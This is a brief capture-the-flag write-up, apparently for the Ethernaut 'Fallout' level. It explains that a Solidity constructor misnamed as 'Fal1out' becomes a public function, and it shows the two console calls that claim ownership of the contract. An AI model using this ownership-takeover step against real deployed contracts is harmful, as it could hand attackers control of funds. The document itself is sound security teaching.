In this exercise we learn that if a constructor has a different name than the smart contract, it may become a callable function which could allow an arbitrary attacker become the owner of the contract.

### Solution

Call the constructor of the contract and verify that the player is now the owner:
```
await contract.Fal1out()
await contract.owner() === player
```
